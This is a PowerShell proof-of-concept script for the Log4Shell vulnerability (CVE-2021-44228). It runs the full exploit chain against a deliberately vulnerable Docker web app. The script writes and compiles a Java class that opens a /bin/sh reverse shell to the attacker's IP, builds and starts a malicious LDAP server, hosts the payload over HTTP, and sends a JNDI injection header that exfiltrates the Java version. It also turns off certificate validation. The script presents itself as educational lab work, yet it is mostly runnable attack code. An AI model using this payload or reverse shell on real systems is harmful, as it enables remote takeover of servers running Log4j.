Write-Host "Log4Shell (CVE-2021-44228) PoC" -ForegroundColor Green
Write-Host "https://github.com/aalex954" -ForegroundColor Green
Write-Host ''
Write-Host "This PowerShell script starts multiple processes (netcat listener, malicious LDAP and HTTP server, and a vulnerable web app hosted from a Docker image.)"
Write-Host "For educational purposes we will run through the entire exploit chain, dynamically creating the Java exploit class and ultimately producing a reverse shell on the web server."
Write-Host "Embeded in the LDAP server logs you will also find an exfiltrated variable `${java:version} ."
Write-Host ''
Write-Host "PREREQUISITES:" -ForegroundColor DarkYellow
Write-Host "    - Docker for Desktop" -ForegroundColor DarkYellow
Write-Host "    - Java 8" -ForegroundColor DarkYellow
Write-Host "    - Maven" -ForegroundColor DarkYellow
Write-Host "    - Python3" -ForegroundColor DarkYellow
Write-Host "    - Internet connectivity (docker image pull, git clone)" -ForegroundColor DarkYellow
Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ''

# Define default variables

$lhost= Read-Host -Prompt "Enter listening IP"
$reverseShellPort = "6666"
$ldapPort = "6667"
$httpFilePort = "6668"
$target = 'http://' + $lhost + ':' + '8080'

$testHeader = @{ 'X-Api-Version' = 'hello' }
$envExfilHeader = @{ 'X-Api-Version' = '${jndi:ldap://' + $lhost + ':' + $ldapPort + '/${java:version}}' }
#$jsonHeader = @{ 'X-Api-Version' = '${jndi:ldap://' + $lhost + ':' + $ldapPort + '/a}' }

Write-Host ''

# Java exploit payload
$payload = @"
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    public Exploit() throws Exception {
        String host="$lhost";
        int port=$reverseShellPort;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
} 
"@

Write-Host "LHOST:......................$lhost" -ForegroundColor Cyan
Write-Host "REVERSE_SHELL_LISTNER_PORT: $reverseShellPort" -ForegroundColor Cyan
Write-Host "LDAP_SERVER_PORT:...........$ldapPort" -ForegroundColor Cyan
Write-Host "HTTP_FILE_SERVER_PORT.......$httpFilePort" -ForegroundColor Cyan
Write-Host "TARGET......................$target" -ForegroundColor Cyan
Write-Host ''

Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan

# Check if dependencies are installed/running
Write-Host "INFO: Checking for installed dependencies.." -ForegroundColor Gray
Write-Host ''

try {
    docker --version
}
catch {
    Write-Host 'Docker is not running.' -ForegroundColor Red
    Write-Host 'Install Docker for Windows' -ForegroundColor Gray

    throw 'ERROR: Exiting'
}
Write-Host ''
Write-Host 'INFO: Docker..OK' -ForegroundColor Gray
Write-Host ''
try {
    java -version
}
catch {
    Write-Host 'Java is not found.' -ForegroundColor Red
    Write-Host 'Check your PATH or install Java, then restart your console' -ForegroundColor Gray
    throw 'ERROR: Exiting'
}
Write-Host ''
Write-Host 'INFO: Java..OK' -ForegroundColor Gray
Write-Host ''
try {
    mvn -v
}
catch {
    Write-Host 'Maven is not installed.' -ForegroundColor Red
    Write-Host 'Try "scoop install maven", then restart your console' -ForegroundColor Gray
    throw 'ERROR: Exiting'
}
Write-Host ''
Write-Host 'INFO: Maven..OK' -ForegroundColor Gray
Write-Host ''
try {
    python3 --version
}
catch {
    Write-Host 'Python3 is not installed.' -ForegroundColor Red
    Write-Host 'Install Python, then restart your console' -ForegroundColor Gray
    Write-Host "https://www.python.org/downloads/windows/" -ForegroundColor Gray
    throw 'ERROR: Exiting'
}
Write-Host ''
Write-Host 'INFO: Python3..OK' -ForegroundColor Gray
Write-Host ''
if (-not (Test-Connection -ComputerName "github.com" -Quiet)) {
    throw "ERROR: Cant resolve github.com. Exiting.."
}
Write-Host ''
Write-Host 'INFO: Internet..OK' -ForegroundColor Gray
Write-Host ''
Write-Host "SUCCESS: All dependencies met!" -ForegroundColor Green

Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Start-Sleep -s 3
Write-Host ''

#----------------------------------------------------------------------------------------------
Write-Host "INFO: Creating Java class payload.." -ForegroundColor Gray

# PAYLOAD CREATION

# Create "exploit" directory if it does not already exist
Write-Host "INFO: Creating exploit directory" -ForegroundColor Gray
$null = New-Item -ItemType Directory -Path ".\exploit" -Force -ErrorAction Stop

# Create reverse shell payload (Exploit.java)
Write-Host "INFO: Copying payload to .\exploit\Exploit.java" -ForegroundColor Gray
$null = New-Item ".\exploit\Exploit.java" -ItemType File -Value "$payload" -Force -ErrorAction Stop

# Compile reverse shell payload (Exploit.class)
Write-Host "INFO: Compiling payload: .\exploit\Exploit.class" -ForegroundColor Gray
Start-Process -FilePath ".\java\java-se-8u41-ri\bin\javac.exe" -ArgumentList ".\exploit\Exploit.java" -ErrorAction Stop

Write-Host "INFO: Testing payload: .\exploit\Exploit.class" -ForegroundColor Gray
if (Test-Path -Path '.\exploit\Exploit.class') {
    Write-Host "SUCCESS: Cretaed reverse shell payload: .\exploit\Exploit.class" -ForegroundColor Green
} else {
    Write-Host "WARNING: Cannot find exploit in: .\exploit\Exploit.class" -ForegroundColor Red
    Write-Host "INFO: Exploitation will not succeed" -ForegroundColor Gray
}

Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ''
Start-Sleep -s 3
#----------------------------------------------------------------------------------------------
# DOCKER TARGET

# Start vulnerable docker image
Write-Host "INFO: Starting Docker container: ghcr.io/christophetd/log4shell-vulnerable-app" -ForegroundColor Gray
try {
    Start-Process -FilePath "docker" -ArgumentList "run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app" -ErrorAction Stop
}
catch {
    Write-Host "WARNING: Cannot start Docker image: log4shell-vulnerable-app" -ForegroundColor Red
    throw 'Exiting..'
}

Write-Host "INFO: Waiting for web server to come online.." -ForegroundColor Gray
$req = 'null'
while ($req.Content -ne "Hello, world!") {
    try{
        $req = Invoke-WebRequest -uri "$target" -Headers $testHeader
    } catch{
        Write-Host 'WARNING: Target web server not ready yet.. Retrying in 5 seconds' -ForegroundColor Yellow
        Start-Sleep -s 5
    }
}

Write-Host "SUCCESS: Web server up! - $($req.StatusCode) $($req.Content)" -ForegroundColor Green

Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ''
Start-Sleep -s 3
#----------------------------------------------------------------------------------------------
# JNDI LDAP SERVER

Write-Host "INFO: Using marshalsec's object deserialization vulnerability project" -ForegroundColor Gray
Write-Host "INFO: https://github.com/mbechler/marshalsec" -ForegroundColor Gray

# Clone git repository
Write-Host "INFO: Cloning Git repository" -ForegroundColor Gray
Start-Process -FilePath "git" -ArgumentList "clone https://github.com/mbechler/marshalsec.git" -WorkingDirectory ".\java" -Wait -ErrorAction Stop

# Set LDAP port in the LDAPRefServer source
Write-Host "INFO: Configuring LDAP listening port" -ForegroundColor Gray
(Get-Content .\java\marshalsec\src\main\java\marshalsec\jndi\LDAPRefServer.java).Replace('int port = 1389;' , "int port = $ldapPort;") | Set-Content .\java\marshalsec\src\main\java\marshalsec\jndi\LDAPRefServer.java -ErrorAction Stop

# Build project with Maven
Write-Host "INFO: Building project from source" -ForegroundColor Gray
Start-Process -FilePath "mvn" -ArgumentList "clean package -DskipTests" -WorkingDirectory ".\java\marshalsec" -Wait -ErrorAction Stop

# Compile and run LDAP Ref Server
Write-Host "INFO: Compiling and running the marshalsec LDAP Ref Server" -ForegroundColor Gray
Start-Process -FilePath "java" -ArgumentList "-cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://$lhost`:$httpFilePort/exploit/#Exploit" -WorkingDirectory ".\java\marshalsec\target" -ErrorAction Stop

Write-Host "Sleeping 5 seconds" -ForegroundColor Gray
Start-Sleep -s 5
try {
    $connection = (New-Object Net.Sockets.TcpClient)
    $connection.Connect("$lhost",$ldapPort)
}
catch {
    
}

if ($($connection).Connected -eq "True") {
    Write-Host "SUCCESS: LDAP server is up!" -ForegroundColor Green
} else {
    Write-Host "WARNING: Cannot connect to LDAP server.." -ForegroundColor Yellow
    Write-Host "INFO: The script will continue. Maybe it needs more time to load.." -ForegroundColor Gray
    Write-Host "INFO: Check if the LDAP server console is displayed and displaying: Listening on 0.0.0.0:$ldapPort" -ForegroundColor Gray
}

Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ''

# Start netcat listener to receive the reverse shell
Write-Host "INFO: Starting netcat to receive the reverse shell.." -ForegroundColor Gray
Start-Process -FilePath ".\tools\ncat.exe" -ArgumentList "-lvn $reverseShellPort" -ErrorAction Stop

Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ''

# Start a python http server to host the exploit payload
Write-Host "INFO: Starting a python HTTP server to host the exploit code.." -ForegroundColor Gray
Start-Process -FilePath "python" -ArgumentList "-m http.server $httpFilePort" -ErrorAction Stop

Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ''

Start-Sleep -s 3

Write-Host "INFO: Setting up the web request.." -ForegroundColor Gray

# Override SSL verify to prevent issues with invalid certificates. 
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
            return true;
        }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$headerString = Write-Output $($jsonHeader.Values)

Write-Host "INFO: Sending request to $target" -ForegroundColor Gray
Write-Host "INFO: Using X-Api-Version header: $headerString" -ForegroundColor Gray
Write-Host "INFO: Check LDAP server logs for exfiltrated Java version env variable" -ForegroundColor Gray

#$uar = $null
try {
    $uar = Invoke-WebRequest $target -Headers $envExfilHeader -TimeoutSec 5 -ErrorAction SilentlyContinue
}catch {
    $uar = $_.Exception
}

Write-Host "SUCCESS: Sent poisoned header to $target" -ForegroundColor Green

Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ''

Write-Host "SUCCESS: All done!" -ForegroundColor Green
Write-Host "Make sure to check the LDAP logs to see the exfiltrated varaible: `${java:version}" -ForegroundColor Gray
Write-Host "Check the ncat.exe console for `"Ncat: Connection from $lhost`:{RANDOM_PORT}`"" -ForegroundColor Gray
Write-Host "This indicates a reverse shell was established from the vulnerable web server" -ForegroundColor Gray
Write-Host "Try typing `"whoami`" to verify the current user (root)!" -ForegroundColor Gray

Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ''

Write-Host "Clean up Docker Images?" -ForegroundColor Yellow
Write-Host ''

$rmDocker = Read-Host -Prompt "Stop and Remove Docker images? (y/n)"
if ($rmDocker -eq "y") {
    Write-Host "INFO: Stopping Docker containers matching filter.." -ForegroundColor Gray
    docker ps -q --filter ancestor=ghcr.io/christophetd/log4shell-vulnerable-app | % { docker stop $_ }
    Write-Host ''
    Write-Host "INFO: Removing Docker containers matching filter.." -ForegroundColor Gray
    docker ps -aq --filter ancestor=ghcr.io/christophetd/log4shell-vulnerable-app | % { docker rm $_ }
}

Write-Host ''
Write-Host "----------------------------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ''